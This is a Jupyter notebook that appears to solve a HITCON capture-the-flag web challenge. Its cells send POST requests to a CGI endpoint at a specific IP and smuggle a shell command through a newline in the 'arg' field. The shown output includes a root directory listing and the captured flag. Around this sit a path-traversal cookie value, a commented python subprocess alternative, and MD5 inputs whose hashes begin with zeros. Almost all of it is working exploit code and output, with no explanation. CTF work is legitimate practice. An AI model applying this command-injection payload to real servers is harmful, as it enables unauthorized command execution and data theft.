{
 "metadata": {
  "name": "",
  "signature": "sha256:f8bed6dacf7896f24bac7ed7bb83e3c6ba578f52b3e540fd68825e4d5ce5bd3e"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import requests"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 2
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "headers = dict()\n",
      "headers = {'User-Agent': 'Mozilla/5.0'}\n",
      "cookies = {\"diagsess\":\"../etc/passwd\"} # doesn't matter\n",
      "cmd =\" ls /\"\n",
      "payload = {\"action\": \"curl\", \"arg\": \"aaa -w xxx\\n\"+cmd}\n",
      "r = requests.post(\"http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=\", data=payload, cookies=cookies, headers=headers)\n",
      "print r.content[r.content.find(\">xxx\")+4:]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "bin\n",
        "boot\n",
        "dev\n",
        "etc\n",
        "home\n",
        "initrd.img\n",
        "key.txt\n",
        "lib\n",
        "lib64\n",
        "lost+found\n",
        "media\n",
        "mnt\n",
        "opt\n",
        "proc\n",
        "read_key\n",
        "root\n",
        "run\n",
        "sbin\n",
        "srv\n",
        "sys\n",
        "tmp\n",
        "usr\n",
        "var\n",
        "vmlinuz\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 10
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "cmd = \"/read_key /key.txt\"\n",
      "# or use python to read stderr\n",
      "# cmd = \"python -c s=__import__('subprocess');print(s.check_output('/read_key'+chr(32)+'/key.txt',stderr=s.STDOUT,shell=True))\"\n",
      "payload = {\"action\": \"curl\", \"arg\": \"aaa -w xxx\\n\"+cmd}\n",
      "r = requests.post(\"http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=\", data=payload, cookies=cookies, headers=headers)\n",
      "print r.content[r.content.find(\">xxx\")+4:]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "HITCON{a755be06b165ed8fc4710d3544fce942}\n",
        "\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 11
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# BTW\n",
      "from hashlib import md5\n",
      "print md5(\"djGFYmi\").hexdigest()\n",
      "print md5(\"ZkjAFaaaa\").hexdigest()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "00000000000ccda838e4b06d6d662dca\n",
        "00000000000639f3eb26b63f0a7baca3\n"
       ]
      }
     ],
     "prompt_number": 3
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": []
    }
   ],
   "metadata": {}
  }
 ]
}